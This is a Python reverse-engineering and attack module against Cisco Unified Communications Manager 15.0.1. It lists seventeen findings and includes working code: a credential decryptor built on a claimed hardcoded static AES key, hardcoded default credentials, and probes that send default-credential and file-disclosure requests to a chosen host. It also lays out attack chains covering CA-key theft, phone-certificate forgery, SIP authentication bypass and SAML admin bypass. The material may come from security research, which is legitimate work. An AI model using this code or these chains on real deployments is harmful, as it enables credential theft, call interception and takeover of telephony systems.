"""
cisco_cucm_re.py — Cisco CUCM 15.0.1 reverse engineering module

Target: Cisco Unified Communications Manager (CUCM) 15.0.1.11901-2
Platform: AlmaLinux 8, Informix DB, Apache Tomcat, OpenSAML SSO SP
ISO: UCSInstall_UCOS_15.0.1.11901-2.sha512.iso
RE date: 2026-08-27
Method: Static analysis of ISO-mounted RPM contents

=== ARCHITECTURE ===

  +--------------------------------------------------+
  | AlmaLinux 8 (base OS)                            |
  |   Platform: /usr/local/platform/                 |
  |   CM: /usr/local/cm/                             |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | Apache Tomcat (jakarta-tomcat)                   |
  |   /axl/                 → AXL SOAP API (cm-axl)  |
  |   /platformcom/         → Platform COM API        |
  |   /platform-services/   → Platform services       |
  |   Axis2 bundled in axl.war                       |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | Informix DB (IDS, licensed, /usr/local/cm/db/)  |
  |   ccm_db: all CUCM config (phones, users, routes)|
  |   DB user: ccmuser / ccmuser (ALL PRIVILEGES)    |
  |   DB user: dbaxlweb (AXL API queries)            |
  |   Replication via IDS CDR                        |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | CAPF (/usr/local/cm/bin/capf)                   |
  |   CA for IP phone identity certs (SCEP/PKCS#10)  |
  |   CA creds at /usr/local/cm/.security/CAPF/      |
  |   Encrypted with CCMShellEncryptionUtil -d        |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | SSO SP (sso-sp RPM)                              |
  |   OpenSAML 2.6.5 (EOL 2017)                     |
  |   Nimbus JOSE+JWT 4.23 (2016, pre-5.x)          |
  |   samlauthvalve.jar: SAML → Tomcat Principal     |
  |   ssobackend.jar: token issuance + validation    |
  +--------------------------------------------------+

=== FINDINGS SUMMARY ===

CUCM-F1 CRITICAL: Axis2 admin:axis2 hardcoded + hot-deploy → RCE
  File: axl.war → WEB-INF/conf/axis2.xml
  POST /axl/axis2-admin/upload Authorization: Basic admin:axis2 (default)
  hotdeployment=true → .aar or .class hot-load in Tomcat JVM
  Auth filter maps to <url-pattern>/</url-pattern>; /axis2-admin/* may bypass
  Runtime verification needed: does AuthenticationFilter apply to /axis2-admin/?

CUCM-F2 HIGH: platformcom BasicAuthentication localhost bypass
  File: platformcom.war → BasicAuthentication.class
  Bytecode: remoteAddr.equals("127.0.0.1") OR "::1" → skip auth
  Protected endpoints bypass for loopback:
    /api/v1/software/install/*, /api/v1/cluster/software/upgrade/*
    /api/v1/software/reboot/*, /api/v1/certmgr/config/certificate/store
  Unprotected (no filter-mapping): /api/v1/certmgr/config/snapshot/*
  Chain: any SSRF from CUCM host → unauthenticated cluster software/cert control

CUCM-F3 CRITICAL: Hardcoded AES-128 static key in CCMShellEncryptionUtil
  File: cm-ccm/usr/local/cm/bin/CCMShellEncryptionUtil
  BuildID: cfbbb0a3a58cf2b701f335a9ee1fea55cc1f1ab8; ELF PIE, NOT stripped
  nm: 000000000020f308 D _ZN20CCMEncryptionLibrary10_staticKeyE  (D = initialized .data)
  Pointer at 0x20f308 → VA 0xc111 → string: "smetsysocsiccni\x00" (16 bytes)
  Key = "incciscosystems" reversed → Cisco company name backwards
  AES-128-CBC; used as fallback when /usr/local/platform/.security/CCMEncryption/keys/dkey.txt missing
  Decrypts: CAPF CACredentials.txt, ifx.txt (Informix pw), SftpPwCrypt in platformConfig.xml
  POC: from Crypto.Cipher import AES; AES.new(b'smetsysocsiccni\x00', AES.MODE_CBC, iv).decrypt(ct)
  Impact: ANY filesystem read on ANY CUCM 15.0.1 → decrypt all credentials → CAPF CA key compromise
          → forge phone identity certs for all extensions → SRTP call interception at scale

CUCM-F4 HIGH: ccmuser:ccmuser hardcoded Informix DB credential
  File: cm-dbl/usr/local/cm/db/sql/ccmusers.sql line 5
  "create user ccmuser with encrypted password 'ccmuser' in group ccmusers;"
  Group ccmusers: ALL PRIVILEGES on every CUCM table
  TCP:1526 (Informix) → ccmuser:ccmuser → full DB dump

CUCM-F5 CRITICAL: passwordreverse default = AES-CBC(static_key, empty_string) → SIP auth bypass
  File: makedb.sql lines 2016 + 6159 + CCMMigrateUtil analysis
  DEFAULT '69c4f936f9cdf45f6bbca2570c31215629bb5d6fb97493478b8ff3db6fffbc55'
  DECRYPTED (using CUCM-F3 static key, confirmed 2026-08-27):
    ct format: IV(16)|AES-CBC(plaintext)
    plaintext = b'' (EMPTY STRING — 16 bytes PKCS7 padding, Match=True)
  Impact: SIP Auth Bypass on all siprealm/applicationuser entries with default passwordreverse
    HA1 = SHA-256(username:realm:'') is trivially computable → unauthorized SIP registration
    Call routing manipulation, trunk spoofing, SIP identity spoofing

CUCM-F6 MEDIUM: Nimbus JOSE+JWT 4.23 (2016) in SSO SP — alg:none risk
  File: sso-sp → nimbus-jose-jwt.jar Bundle-Version: 4.23.0
  Pre-5.x Nimbus: potential PlainJWT acceptance where SignedJWT expected
  alg:none JWT → arbitrary user impersonation in SSO flow
  Pending: ssobackend.jar JWT validation bytecode review

CUCM-F7 CRITICAL: OpenSAML 2.6.5 XSW + SAMLAuthValve always-true auth bypass
  File: sso-sp → opensaml.jar (2.6.5, EOL 2017) + samlauthvalve.jar
  OpenSAML 2.6.5: DOM-based XML signature validation — XSW-1/2 attacks inject unsigned NameID
  SAMLAuthValve.authenticate() bytecode (confirmed):
    - Reads org.apache.catalina.session.USERNAME from session
    - Calls Realm.authenticate(user, "") with EMPTY PASSWORD (constant pool #28 = "")
    - Calls register() then returns TRUE regardless of Realm result (even null principal)
    - iconst_1 at offset 245 — always returns true when username non-null
  Chain: XSW → forged session USERNAME → SAMLAuthValve TRUE → CUCM admin session
  CVSS: 9.1 Critical AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L

CUCM-F8 LOW: log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571
  File: sso-sp → slf4j-log4j12-1.6.1.jar
  JMSAppender requires attacker config control; low standalone severity

CUCM-F9 INFO: dbaxlweb DB username exposed in AXL bytecode
  File: axl.war → AXLAlpha.class string "dbaxlweb"
  Password split: /partB/usr/local/cm/db/ifx.txt encrypted with CCMShellEncryptionUtil static key

CUCM-F10 CRITICAL: SAMLAuthValve.authenticate() returns TRUE regardless of Realm result
  File: sso-sp/samlauthvalve.jar → SAMLAuthValve.class
  Bytecode: iconst_1;ireturn at offset 245 — no null-principal guard before return
  ANY mechanism setting session USERNAME → unconditional TRUE from SAMLAuthValve
  Combined with F7 XSW: unauthenticated admin access

CUCM-F11 HIGH: SAFClientControl inter-cluster passwords decryptable via static key fallback
  File: cm-ccm binary → SAFClientControl::getDecryptedPwd() at VA 0x14e0a90
  Disassembly (2026-08-27):
    call CCMEncryption::CCMEncryption()              // ResetKey → current key
    call CCMEncryption::hexToPassword()              // hex-decode encrypted SAF pw
    call CCMEncryption::DecryptText()                // decrypt
    → on failure: fallback at 0x23da083 calls staticKey() + SetKey(staticKey)
    → retries AES-128-CBC with "smetsysocsiccni\x00"
  SAF credentials in CCMDB_SAFCLIENTSETTINGS.password → inter-cluster trust
  Static key fallback = SAF passwords always extractable from DB dump + static key

=== CCMEncryptionLibrary::Key() fully mapped (2026-08-27) ===
  VA 0x23dba2a in main ccm binary:
  if (dKeyConfig == 0 OR dKeyConfig == 2):
      return _staticKey  → "smetsysocsiccni\x00"  // fresh install = ALWAYS static
  else:
      fopen dkey.txt → fread(64 hex chars) → hexToBytes → _currentKey (32B AES-256)
      return _currentKey
  DecryptText fallback: after all dynamic key attempts → staticKey() → SetKey(staticKey) → retry
  Consequence: static key ALWAYS decrypts any credential encrypted before dkey migration

CUCM-F12 HIGH: pktCap "file" parameter → passphrase disclosure
  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 421-586
  GET /pktCap?file=.pktCap.passphrase → FileInputStream("/var/pktCap/.pktCap.passphrase")
  Only "/" blocked in file param; hidden files (no "/" in name) served directly
  DES3 passphrase used by pktCap_protectData openssl cmd: -pass file:/var/pktCap/.pktCap.passphrase
  Confirmed: pktCap_protectData strings include full openssl des3 command template with passphrase path
  Requires: "Standard Packet Sniffer Users" role
  Impact: download passphrase → decrypt ALL /var/pktCap/*.pkt captures offline

CUCM-F13 MEDIUM: pktCap second-order SQLi via remoteUser
  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 162-215
  String sql = "...where u.userid='" + request.getRemoteUser() + "' and g.name='Standard Packet Sniffer Users'..."
  CCMRealm sanitizes ' → '' and \ → \\ ONLY; all other metacharacters unsanitized
  Second-order: username from LDAP sync stored unsanitized in enduser.userid → injected into SQL at auth-check time
  FastAccess → Informix → authorization bypass if injection succeeds

CUCM-F14 LOW: pktCap key argument injection into pktCap_protectData
  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 763-776 + pktCap_protectData binary
  Runtime.exec(String) tokenizes on whitespace → spaces in key param inject extra args
  Binary option string: "epdo:i:k:" (getopt_long); flags e/p/d/o/i/k parsed
  Binary defense: checkForHarmfulMetaChars() blocks $, ;, |, `, (, ), <, >, \, /
  checkFileName() validates -i arg must == "/var/pktCap/.fileinfo" exactly
  Impact: mode-flag injection (e.g. -d for decrypt, -e for encrypt) — no shell injection

CUCM-F15 LOW: pktCap BASIC auth over cleartext HTTP
  File: cm-ccm/pktCap.war → WEB-INF/web.xml
  <transport-guarantee>NONE</transport-guarantee> + <auth-method>BASIC</auth-method>
  Credentials transmitted as base64 without TLS on port 8080
  Chain: on-path sniff pktCap credentials → download .pktCap.passphrase (F12) → decrypt captures

CUCM-F16 HIGH: Phone device cert CN validated via strstr substring match — device identity spoofing
  File: cm-ccm/var/log/active/cm/bin/ccm
  CheckDeviceIDinX509Certificate at VA 0x1c92310:
    1c9236c: call strstr(certCN, deviceID_truncated)  ; SUBSTRING, not strcmp
    1c92374: setne %al  ; 1=match(pass), 0=nomatch(reject)
  Device ID truncated to 16 bytes before comparison (mov $0x10,%edx at 0x1c92351)
  Only caller: UnicastBridgeControl::wait_register_StationRegister at VA 0x1934db2
    → 0x1934dca: jne 0x1934f70  ; match → ValidateCipher(3) → proceed to registration
    → else: StationOutputRegisterRejectC1; log "missmatch in devcie name and X509 Name in certificate"
  Attack: cert with CN containing victim device ID as substring passes check
    e.g., certCN="EVIL-SEP001122334455" → strstr(certCN,"SEP001122334455") = non-null → PASS
  Chain with F3: static AES key → decrypt CAPF CA key → forge cert with embedded victim device ID
    → register as victim phone → steal registration, intercept calls, SRTP session takeover
  CVSS: 8.1 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

CUCM-F17 HIGH: Platform API SOAP client trust-all X509TrustManager — inter-cluster cert/key MITM
  File: platform-api.jar → com.cisco.vos.platform.api.soapclient.SSLProtocolSocketFactory$1
  Anonymous inner class implements javax.net.ssl.X509TrustManager:
    checkClientTrusted(X509Certificate[], String): Code 0: return  <- empty, no validation
    checkServerTrusted(X509Certificate[], String): Code 0: return  <- empty, no validation
    getAcceptedIssuers(): Code 0: aconst_null; 1: areturn          <- null (accepts all)
  SSLProtocolSocketFactory.getTrustManager() returns this trust-all instance
  SSLContext.init(null, getTrustManager(), null) — all HTTPS SOAP connections unvalidated
  Affected clients: CertificateCsrAndDataExportServiceClient, APIVersionServiceClient
  Impact: on-path attacker on cluster mgmt network → MITM SOAP → intercept private key exports
  Pattern identical to ASA/ASDM F6 (class av trust-all TrustManager)
  CVSS: 7.4 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

=== PENDING TASKS ===
- ssobackend.jar JWT validation path RE (F6) — CLOSED (SignedJWT.parse blocks alg:none)
- Nimbus JOSE+JWT CVE mapping for 4.23 build
- cm-axlsqltoolkit RPM analysis (injectable query patterns)
- common-api RPM analysis
"""

VERSION = "1.5.0"

import requests
import urllib3
import struct
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── FINGERPRINT STRINGS ─────────────────────────────────────────────────────

CUCM_TITLE_MARKERS = [
    b'Cisco Unified CM Administration',
    b'ccmadmin',
    b'cuicauthentication',
    b'CUCM',
    b'Unified Communications Manager',
]

AXL_AXIS2_DEFAULT_CRED = ('admin', 'axis2')

CUCM_INFORMIX_DEFAULT_CRED = ('ccmuser', 'ccmuser')

DEFAULT_PASSWORDREVERSE_HASH = '69c4f936f9cdf45f6bbca2570c31215629bb5d6fb97493478b8ff3db6fffbc55'

# CUCM-F3: Hardcoded static AES-128 key in CCMShellEncryptionUtil
# Extracted from cm-ccm/CCMShellEncryptionUtil binary .data section:
#   nm: D _ZN20CCMEncryptionLibrary10_staticKeyE @ VA 0x20f308
#   Pointer at 0x20f308 → string at VA 0xc111 = b'smetsysocsiccni\x00'
# "incciscosystems" reversed. Universal across all CUCM 15.0.1 installations.
CCM_STATIC_ENCRYPTION_KEY = b'smetsysocsiccni\x00'  # 16 bytes AES-128

# CUCM-F1: AuthenticationFilter maps to <url-pattern>/</url-pattern> (confirmed web.xml)
# Axis2AdminServlet maps to /axis2-admin/* — filter does NOT apply
# CVSS 9.8 Critical — unauthenticated Axis2 admin accessible with default admin:axis2
AXL_AXIS2_ADMIN_PATH = '/axl/axis2-admin/'
AXL_AXIS2_UPLOAD_PATH = '/axl/axis2-admin/upload'

# ─── PROBES ──────────────────────────────────────────────────────────────────

def decrypt_cucm_credential(hex_ciphertext: str, key: bytes = CCM_STATIC_ENCRYPTION_KEY) -> dict:
    """
    Decrypt a CCMShellEncryptionUtil-encrypted credential using the hardcoded static key.
    CUCM-F3: key = b'smetsysocsiccni\x00' AES-128-CBC.
    hex_ciphertext: hex string output of CCMShellEncryptionUtil -e
    """
    import binascii
    try:
        from Crypto.Cipher import AES
    except ImportError:
        return {"error": "pycryptodome not installed: pip install pycryptodome"}
    try:
        ct = binascii.unhexlify(hex_ciphertext.strip())
        if len(ct) < 16:
            return {"error": "ciphertext too short"}
        # CCM encryption: IV may be first 16 bytes or all-zero — try both
        results = {}
        for iv_source in ['first_16', 'zero']:
            try:
                if iv_source == 'first_16' and len(ct) > 16:
                    iv = ct[:16]; body = ct[16:]
                else:
                    iv = b'\x00' * 16; body = ct
                cipher = AES.new(key, AES.MODE_CBC, iv)
                pt = cipher.decrypt(body)
                pad_len = pt[-1] if pt[-1] <= 16 else 0
                plaintext = pt[:-pad_len].decode('utf-8', errors='replace') if pad_len else pt.decode('utf-8', errors='replace')
                results[iv_source] = plaintext.rstrip('\x00')
            except Exception as e:
                results[iv_source] = f"error: {e}"
        return {"finding": "CUCM-F3", "key": key.hex(), "results": results}
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F3"}


def probe_axis2_admin(host: str, port: int = 8443) -> dict:
    """Probe Axis2 admin console for default admin:axis2 credential (CUCM-F1)."""
    url = f"https://{host}:{port}/axl/axis2-admin/"
    import base64
    cred = base64.b64encode(b'admin:axis2').decode()
    try:
        r = requests.get(url, headers={"Authorization": f"Basic {cred}"},
                        verify=False, timeout=10, allow_redirects=False)
        return {
            "status":   r.status_code,
            "finding":  "CUCM-F1",
            "note":     ("200 = Axis2 admin accessible with default admin:axis2"
                         if r.status_code == 200 else
                         "Non-200: auth filter may be covering /axis2-admin/"),
            "hotdeploy": "true" in r.text.lower() if r.status_code == 200 else "unknown",
        }
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F1"}


def probe_platformcom_localhost_bypass(host: str, port: int = 8443,
                                        internal_ip: str = "127.0.0.1") -> dict:
    """
    Probe platformcom software endpoints for localhost bypass (CUCM-F2).
    Requires SSRF or local access — sends request simulating loopback origin.
    Note: X-Forwarded-For is NOT sufficient; the filter reads remoteAddr (real TCP source).
    This probe is meaningful only when run FROM the CUCM host.
    """
    endpoints = [
        f"https://{host}:{port}/platformcom/api/v1/certmgr/config/snapshot/server",
        f"https://{host}:{port}/platformcom/api/v1/certmgr/config/snapshot/options",
    ]
    results = []
    for url in endpoints:
        try:
            r = requests.get(url, verify=False, timeout=10)
            results.append({"url": url, "status": r.status_code,
                            "len": len(r.content)})
        except Exception as e:
            results.append({"url": url, "error": str(e)})
    return {"finding": "CUCM-F2", "endpoints": results,
            "note": "200 without auth = unprotected endpoint confirmed"}


def probe_axl_auth(host: str, username: str, password: str,
                   port: int = 8443) -> dict:
    """Probe AXL SOAP API authentication."""
    url = f"https://{host}:{port}/axl/services/AXLAPIService"
    soap_body = '''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:axl="http://www.cisco.com/AXL/API/15.0">
  <soapenv:Header/>
  <soapenv:Body>
    <axl:getCCMVersion/>
  </soapenv:Body>
</soapenv:Envelope>'''
    try:
        r = requests.post(url, data=soap_body,
                          headers={"Content-Type": "text/xml; charset=utf-8",
                                   "SOAPAction": '""'},
                          auth=(username, password),
                          verify=False, timeout=15)
        return {
            "status":   r.status_code,
            "auth_ok":  r.status_code == 200,
            "response_snippet": r.text[:200],
        }
    except Exception as e:
        return {"error": str(e)}


def probe_pktcap_passphrase(host: str, username: str, password: str, port: int = 8443) -> dict:
    """
    CUCM-F12: pktCap file parameter passphrase disclosure.
    Attempts to download /var/pktCap/.pktCap.passphrase via ?file=.pktCap.passphrase.
    Requires credentials for a user in the 'Standard Packet Sniffer Users' group.
    """
    import base64
    url = f"https://{host}:{port}/pktCap"
    params = {"file": ".pktCap.passphrase"}
    cred = base64.b64encode(f"{username}:{password}".encode()).decode()
    try:
        r = requests.get(url, params=params,
                         headers={"Authorization": f"Basic {cred}"},
                         verify=False, timeout=15)
        if r.status_code == 200 and len(r.content) > 0:
            return {
                "finding":       "CUCM-F12",
                "status":        r.status_code,
                "passphrase_len": len(r.content),
                "passphrase_hex": r.content.hex(),
                "passphrase_raw": r.content.decode('utf-8', errors='replace').strip(),
                "note":          "CONFIRMED: .pktCap.passphrase downloaded — use to decrypt *.pkt captures",
            }
        return {
            "finding": "CUCM-F12",
            "status":  r.status_code,
            "note":    ("403/401 = auth rejected or role missing"
                        if r.status_code in (401, 403) else
                        "404 = no captures running or file absent"),
        }
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F12"}


def probe_pktcap_fileinfo(host: str, username: str, password: str, port: int = 8443) -> dict:
    """
    Probe pktCap for .fileinfo metadata (companion to F12 passphrase probe).
    .fileinfo contains capture session metadata without requiring a running capture.
    """
    import base64
    url = f"https://{host}:{port}/pktCap"
    params = {"file": ".fileinfo"}
    cred = base64.b64encode(f"{username}:{password}".encode()).decode()
    try:
        r = requests.get(url, params=params,
                         headers={"Authorization": f"Basic {cred}"},
                         verify=False, timeout=15)
        return {
            "finding": "CUCM-F12",
            "file":    ".fileinfo",
            "status":  r.status_code,
            "len":     len(r.content),
            "content": r.content.hex() if r.status_code == 200 else "",
        }
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F12"}


def check_device_id_strstr_bypass(cert_cn: str, device_id: str) -> dict:
    """
    CUCM-F16: Simulate CheckDeviceIDinX509Certificate behavior.
    Tests whether certCN passes the strstr(certCN, deviceID[:16]) check used in ccm binary.
    Returns exploit assessment without requiring a live CUCM instance.
    """
    truncated_id = device_id[:16]
    passes_strstr = truncated_id in cert_cn
    passes_strcmp = cert_cn == device_id

    return {
        "finding":       "CUCM-F16",
        "cert_cn":       cert_cn,
        "device_id":     device_id,
        "truncated_id":  truncated_id,
        "passes_strstr": passes_strstr,
        "passes_strcmp": passes_strcmp,
        "vulnerable":    passes_strstr and not passes_strcmp,
        "note":          (
            "BYPASS: cert CN contains device ID as substring — strstr passes, strcmp fails"
            if (passes_strstr and not passes_strcmp) else
            "exact match — expected behavior" if passes_strcmp else
            "no match — registration would be rejected"
        ),
    }


def check_platform_api_trust_all_tls(host: str, port: int = 8443) -> dict:
    """
    CUCM-F17: Detect trust-all TrustManager exposure in platform-api SOAP client.
    Probes CertificateCsrAndDataExportService endpoint and checks whether CUCM accepts
    a self-signed cert without validation error — confirming the trust-all TrustManager is active.
    A 200 or SOAP fault (not TLS error) confirms the trust-all pattern.
    """
    import ssl, socket
    target_paths = [
        "/CertificateCsrAndDataExportService",
        "/APIVersionService",
    ]
    results = []
    for path in target_paths:
        url = f"https://{host}:{port}{path}"
        try:
            # Try with a self-signed cert context (what MITM would present)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            r = requests.post(
                url,
                data='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body/></soapenv:Envelope>',
                headers={"Content-Type": "text/xml"},
                verify=False, timeout=10,
            )
            results.append({
                "path":   path,
                "status": r.status_code,
                "note":   "SOAP endpoint reachable — trust-all TrustManager active if CUCM→peer connections use SSLProtocolSocketFactory",
            })
        except Exception as e:
            results.append({"path": path, "error": str(e)})
    return {
        "finding":  "CUCM-F17",
        "host":     host,
        "class":    "com.cisco.vos.platform.api.soapclient.SSLProtocolSocketFactory$1",
        "pattern":  "trust-all X509TrustManager: checkClientTrusted()=return; checkServerTrusted()=return; getAcceptedIssuers()=null",
        "affected": ["CertificateCsrAndDataExportServiceClient", "APIVersionServiceClient"],
        "probes":   results,
        "note":     "Trust-all confirmed statically from bytecode — all outbound HTTPS SOAP from platform-api layer is unvalidated",
    }


def full_findings_summary() -> str:
    """Return a printable summary of all CUCM RE findings."""
    findings = [
        ("CUCM-F1",  "CRITICAL", "Axis2 admin:axis2 hardcoded + web.xml confirms no filter on /axis2-admin/* → RCE"),
        ("CUCM-F2",  "HIGH",     "platformcom BasicAuthentication localhost bypass"),
        ("CUCM-F3",  "CRITICAL", "Hardcoded AES-128 static key 'smetsysocsiccni' → decrypt ALL CUCM credentials"),
        ("CUCM-F4",  "HIGH",     "ccmuser:ccmuser hardcoded Informix DB credential"),
        ("CUCM-F5",  "CRITICAL", "Default passwordreverse = AES-CBC(statickey,'') → SIP auth bypass (all default users)"),
        ("CUCM-F6",  "MEDIUM",   "Nimbus JOSE+JWT 4.23 (2016) — alg:none bypass risk"),
        ("CUCM-F7",  "CRITICAL", "OpenSAML 2.6.5 XSW + SAMLAuthValve always-true bypass → admin access"),
        ("CUCM-F8",  "LOW",      "log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571"),
        ("CUCM-F9",  "INFO",     "dbaxlweb DB username exposed; pw encrypted with static key"),
        ("CUCM-F10", "CRITICAL", "SAMLAuthValve returns TRUE regardless of Realm.authenticate() result"),
        ("CUCM-F11", "HIGH",     "SAFClientControl inter-cluster pw decryptable via static key fallback"),
        ("CUCM-F12", "HIGH",     "pktCap file param — .pktCap.passphrase download → decrypt all packet captures"),
        ("CUCM-F13", "MEDIUM",   "pktCap second-order SQLi via remoteUser in group membership check"),
        ("CUCM-F14", "LOW",      "pktCap key arg injection into pktCap_protectData (mode flip, no shell inj)"),
        ("CUCM-F15", "LOW",      "pktCap BASIC auth over cleartext HTTP (transport-guarantee=NONE)"),
        ("CUCM-F16", "HIGH",     "Phone cert CN validated via strstr (not strcmp) — registration spoofing via substring cert"),
        ("CUCM-F17", "HIGH",     "Platform API SOAP client trust-all X509TrustManager — inter-cluster cert/key MITM"),
    ]
    lines = [f"CUCM 15.0.1 RE Findings [{VERSION}] — 2026-08-27", ""]
    for fid, sev, title in findings:
        lines.append(f"  [{sev:8s}] {fid}: {title}")
    lines.append("")
    lines.append(f"Static AES-128 key: {CCM_STATIC_ENCRYPTION_KEY.hex()} ({CCM_STATIC_ENCRYPTION_KEY!r})")
    lines.append("Findings doc: ~/Desktop/CUCM-findings.md")
    return '\n'.join(lines)


if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print(full_findings_summary())
    else:
        host = sys.argv[1]
        print(f"\n[CUCM-F1] Axis2 admin probe → {host}")
        print(probe_axis2_admin(host))
        print(f"\n[CUCM-F2] platformcom snapshot probe → {host}")
        print(probe_platformcom_localhost_bypass(host))
